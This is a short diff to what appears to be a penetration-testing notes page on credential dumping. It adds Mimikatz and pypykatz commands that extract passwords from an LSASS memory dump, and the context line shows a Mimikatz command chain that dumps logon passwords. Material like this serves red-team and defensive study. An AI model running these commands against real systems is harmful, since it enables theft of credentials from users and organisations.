@@ -16,6 +16,21 @@ mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump
 
 **Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
 
+### Retrieve passwords from LSASS Dump:
+
+```text
+sekurlsa::minidump lsass.DMP
+sekurlsa::logonPasswords full
+```
+
+Linux:
+
+```text
+pypykatz lsa minidump lsass.DMP
+```
+
+### 
+
 ### Invoke-Mimikatz
 
 ```bash
